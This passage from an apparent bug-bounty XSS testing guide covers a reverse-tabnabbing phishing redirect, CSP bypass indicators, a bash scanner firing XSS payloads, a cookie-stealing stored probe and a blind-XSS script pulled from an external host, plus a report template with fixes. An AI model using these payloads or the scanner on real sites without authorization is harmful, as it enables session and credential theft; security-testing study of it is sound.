// Malicious page payload:
window.opener.location = 'https://phishing-site.com/login';
```
Combined with XSS or social engineering, this allows credential theft — the user sees a login page in the original tab and enters credentials.

## XSS Prevention Features to Identify

When testing, look for these protection mechanisms and try to bypass them:

- **CSP** (Content Security Policy): Check `script-src`, `default-src`, `base-uri`, `object-src`
- **X-XSS-Protection**: Deprecated but still present (IE/Edge legacy)
- **X-Content-Type-Options: nosniff**: MIME sniffing prevention
- **CORS headers**: Cross-origin read blocking
- **Trusted Types**: Modern CSP enforcement for DOM XSS
- **HTML Sanitizers**: DOMPurify, sanitize-html, Bleach (check bypasses!)
- **WAF/IDS**: ModSecurity, Cloudflare, Akamai, AWS WAF
- **Contextual Encoding**: Check whether encoding is HTML, JS, URL, or CSS context
- **SameSite Cookies**: `SameSite=Lax/Strict` limits CSRF but not XSS
- **HttpOnly Cookies**: Prevents cookie theft via JS
- **Subresource Integrity (SRI)**: Prevents CDN-based CSP bypass
- **Trusted Types**: `require-trusted-types-for 'script'` blocks DOM XSS

### CSP Analysis Command

```bash
# Extract CSP headers
curl -skI "https://target.com/page" | grep -i content-security-policy

# Common CSP bypass indicators
# 'unsafe-inline' in script-src → trivial XSS
# 'unsafe-eval' in script-src → bypass via eval()
# Missing base-uri → base tag injection
# Missing object-src → plugin XSS (Flash, PDF)
# Wildcard in script-src → CDN callback bypass
# Nonce reuse → nonce prediction/stealing
```

## Known XSS Filter Bypasses From Real HackerOne Reports

1. **#1665658** (GitLab): CSP bypass via labels' color CSS injection
2. **#1693150** (GitLab): CSP bypass via scoped labels' color
3. **#1588732** (GitLab): CSP bypass in project settings page
4. **#1212067** (GitLab): Stored XSS in markdown via DesignReferenceFilter
5. **#1731349** (GitLab): Stored XSS via Kroki diagram
6. **#488147** (PayPal): Cache poisoning → stored XSS
7. **#510152** (PayPal): Bypass for #488147 stored XSS
8. **#1567186** (Reddit): Response-type switch + XSS on redditmedia.com
9. **#231053** (Shopify): HTML5 structured clone in postMessage
10. **#422043** (Shopify): DOM XSS via Shopify.API.setWindowLocation
11. **#998398** (Elastic): Prototype pollution → XSS
12. **#1424094** (Glassdoor): Web cache poisoning → stored XSS
13. **#1760213** (Expedia): Cache poisoning + XSS → ATO
14. **#2012519** (TikTok): CRLF → XSS & Open redirect
15. **#2189960** (TikTok): CRLF injection → internal XSS
16. **#484434** (Imgur): Stored XSS via profile field
17. **#540513** (Multiple): mXSS via mutation observables
18. **#1067321** (New Relic): Stored XSS via synthetics monitor tag
19. **#259100** (Quora): XSS via JSONP `__e2e_action_id`
20. **#2819573** (Basecamp): Mutation based stored XSS on Trix editor
21. **#2521419** (Basecamp): Stored XSS on trix editor 2.1.1
22. **#207042** (HackerOne): postMessage frame-jumping + jQuery-JSONP XSS
23. **#1095934** (FetLife): Angular expression injection
24. **#880099** (GitLab): Unrestricted file upload → stored XSS
25. **#1276742** (Shopify): Stored XSS in SVG file as data: URL
26. **#3017551** (Nextcloud): ReDoS + Stored XSS in rich text editor
27. **#2257080** (GitLab): Stored XSS via Banzai pipeline
28. **#3071192** (Nextcloud): Stored XSS via plain text message 2FA
29. **#3316910** (Cloudflare): Second-order XSS via javascript: protocol in MCP Server
30. **#3321406/#3423950** (Cloudflare): Self-XSS + cookie tossing + CSRF prediction → ATO

## Full XSS Testing Script

```bash
#!/bin/bash
# Comprehensive XSS scanner
TARGET=$1

# Phase 1: Reflected XSS parameters
PARAMS="q s search query page id file name email url redirect next return callback error message msg text comment desc title subject body content type format lang sort filter tag cat term product item user account ref source action do mode view func debug test preview"

# Phase 2: Test context-aware payloads
HTML_PAYLOADS=(
  '<script>alert(1)</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  '<body onload=alert(1)>'
  '<details open ontoggle=alert(1)>'
  '<input autofocus onfocus=alert(1)>'
  '<video><source onerror=alert(1)>'
)

ATTR_PAYLOADS=(
  '" autofocus onfocus=alert(1) x="'
  "' autofocus onfocus=alert(1) x='"
  '" onmouseover=alert(1) '
  'javascript:alert(1)'
)

JS_PAYLOADS=(
  "';alert(1);//"
  '";alert(1);//'
  '</script><script>alert(1)</script>'
)

echo "=== Testing Reflected XSS ==="
for param in $PARAMS; do
  for payload in "${HTML_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    response=$(curl -sk "https://$TARGET/page?$param=$encoded" 2>/dev/null)
    if echo "$response" | grep -qF "alert(1)"; then
      echo "[HTML] XSS: $param -> $payload"
    fi
  done
done

echo "=== Testing Stored XSS ==="
curl -sk -X POST "https://$TARGET/profile/update" \
  -d "name=<script>alert(document.cookie)</script>" \
  -o /dev/null
curl -sk "https://$TARGET/profile" | grep -q "alert(document.cookie)" && \
  echo "[STORED] XSS in profile name"

echo "=== Testing Blind XSS ==="
curl -sk -X POST "https://$TARGET/feedback" \
  -d "name=test&email=test@test.com&message=<script src=https://YOUR.xss.ht/blind></script>" \
  -o /dev/null
```

## Report Template

```markdown
**Summary:**
XSS vulnerability in [parameter/field] at [endpoint] allows [type: reflected/stored/DOM] 
cross-site scripting, leading to [impact].

**Impact:**
An attacker can exploit this XSS to [steal user sessions / perform actions on behalf of 
victim / exfiltrate sensitive data / achieve account takeover].

**Affected Endpoint:**
https://target.com/[path]?[parameter]=PAYLOAD

**Type:** [Reflected | Stored | DOM-based | Blind | mXSS]

**Steps to Reproduce:**
1. [Navigate to endpoint / Submit form / Upload file]
2. [Inject payload] in [parameter/field]
3. [Payload executes / Payload is stored and triggers on page view]

**Proof of Concept:**
```
Request:
GET /page?q=<script>alert(document.domain)</script> HTTP/1.1
Host: target.com

Response (showing reflected payload):
<div class="search-results">
  Results for: <script>alert(document.domain)</script>
</div>
```

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (6.1 Medium)
- Reflected: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (6.1)
- Stored: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (8.1 High)
- Stored + ATO: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (8.8 High)

**Suggested Fix:**
1. Use context-aware output encoding (OWASP Java Encoder, ESAPI)
2. Implement Content Security Policy (CSP) with strict directives
3. Validate and sanitize all user input on both client and server
4. Use DOMPurify or similar for HTML sanitization
5. Set HttpOnly and Secure flags on session cookies
6. Use X-Content-Type-Options: nosniff header
